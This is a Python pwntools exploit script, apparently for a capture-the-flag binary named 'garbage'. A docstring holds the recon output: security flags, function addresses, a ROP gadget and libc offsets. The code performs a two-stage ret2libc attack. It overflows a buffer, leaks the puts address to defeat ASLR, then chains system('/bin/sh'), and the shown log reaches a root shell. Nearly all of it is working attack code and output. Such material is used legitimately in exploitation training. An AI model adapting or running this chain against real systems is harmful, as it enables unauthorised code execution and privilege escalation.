#!/usr/bin/env python3

"""

Canary                        : No
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial


gefâž¤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  putchar@plt
0x0000000000401040  strcpy@plt
0x0000000000401050  puts@plt
0x0000000000401060  fclose@plt
0x0000000000401070  getpwuid@plt
0x0000000000401080  getuid@plt
0x0000000000401090  printf@plt
0x00000000004010a0  rewind@plt
0x00000000004010b0  fgetc@plt
0x00000000004010c0  read@plt
0x00000000004010d0  fgets@plt
0x00000000004010e0  strcmp@plt
0x00000000004010f0  getchar@plt
0x0000000000401100  gets@plt
0x0000000000401110  syslog@plt
0x0000000000401120  access@plt
0x0000000000401130  fopen@plt
0x0000000000401140  __isoc99_scanf@plt
0x0000000000401150  strcat@plt
0x0000000000401160  exit@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401252  func1
0x0000000000401260  func2
0x0000000000401274  func3
0x0000000000401283  func4
0x0000000000401291  func5
0x000000000040129f  func6
0x00000000004012ad  func7
0x00000000004012bb  func8
0x00000000004012e1  func9
0x0000000000401316  launch
0x0000000000401329  cancel
0x000000000040133c  checkbalance
0x000000000040135c  print_hex
0x0000000000401387  print_decimal
0x00000000004013b2  unused_func
0x0000000000401459  check_user
0x00000000004014d4  set_username
0x0000000000401513  auth
0x0000000000401619  main
0x0000000000401740  __libc_csu_init
0x00000000004017a0  __libc_csu_fini
0x00000000004017a4  _fini


root@kali:~/Scrivania/binaries/garbage# ROPgadget --binary garbage | grep 'pop rdi'
0x000000000040179b : pop rdi ; ret


root@kali:~/Scrivania/binaries/garbage# objdump -D garbage | grep puts
0000000000401050 <puts@plt>:
  401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
  401321:	e8 2a fd ff ff       	callq  401050 <puts@plt>
  401334:	e8 17 fd ff ff       	callq  401050 <puts@plt>
  4014c3:	e8 88 fb ff ff       	callq  401050 <puts@plt>
  4015fa:	e8 51 fa ff ff       	callq  401050 <puts@plt>
  40160d:	e8 3e fa ff ff       	callq  401050 <puts@plt>
  401651:	e8 fa f9 ff ff       	callq  401050 <puts@plt>
  40165d:	e8 ee f9 ff ff       	callq  401050 <puts@plt>
  401669:	e8 e2 f9 ff ff       	callq  401050 <puts@plt>
  401675:	e8 d6 f9 ff ff       	callq  401050 <puts@plt>
  401681:	e8 ca f9 ff ff       	callq  401050 <puts@plt>
  40168d:	e8 be f9 ff ff       	callq  401050 <puts@plt>
  401699:	e8 b2 f9 ff ff       	callq  401050 <puts@plt>
  40171c:	e8 2f f9 ff ff       	callq  401050 <puts@plt>


readelf -s /lib/x86_64-linux-gnu/libc.so.6| grep puts
   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
   501: 00000000000fefe0  1241 FUNC    GLOBAL DEFAULT   14 putspent@@GLIBC_2.2.5
   685: 0000000000100ae0   697 FUNC    GLOBAL DEFAULT   14 putsgent@@GLIBC_2.10
  1154: 0000000000072af0   338 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
  1698: 0000000000072af0   338 FUNC    GLOBAL DEFAULT   14 _IO_fputs@@GLIBC_2.2.5
  2336: 000000000007cd00   151 FUNC    WEAK   DEFAULT   14 fputs_unlocked@@GLIBC_2.2.5


root@kali:~/Scrivania/binaries/garbage# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 183cee /bin/sh

 readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
   235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
   613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5


root@kali:~/Scrivania/binaries/garbage# ./exploit.py 
	[+] Starting program './garbage': Done
	[+] leaked puts address: 0x7fc6452f7040
	[*] offset: 0x7fc645283000
	[+] /bin/sh address: 0x7fc645406cee
	[+] system() address: 0x7fc6452c9ff0
	[*] Switching to interactive mode
	$ whoami
	root
	$
"""

from pwn import *

p = process("./garbage")


password = "N3veRF3@r1iSh3r3!"

junk = ("A" * 136).encode()

pop_gadget = p64(0x40179b) # pop rdi ; ret
puts_got = p64(0x404028)
puts_plt = p64(0x401050)
main_plt = p64(0x401619)

puts_libc = 0x74040

bin_sh_string_libc = 0x183cee
system_libc = 0x46ff0


#First stage: leaking puts@got to calculate the offset

buf = b""
buf += junk
buf += pop_gadget
buf += puts_got
buf += puts_plt
buf += main_plt

p.sendline(buf)

p.recvuntil("access denied.")

p.recvline()

leaked_puts = u64(p.recv().strip().ljust(8, b"\x00"))
offset = (leaked_puts - puts_libc)


log.success("leaked puts address: " + str(hex(leaked_puts)))
log.info("offset: " + str(hex(offset)))


bin_sh = p64( bin_sh_string_libc + offset)
system = p64( system_libc + offset )

log.success("/bin/sh address: " + hex(u64(bin_sh)))
log.success("system() address: " + hex(u64(system)))

buf = b""
buf += junk
buf += pop_gadget
buf += bin_sh
buf += system

p.sendline(buf)

p.recv()


p.interactive()

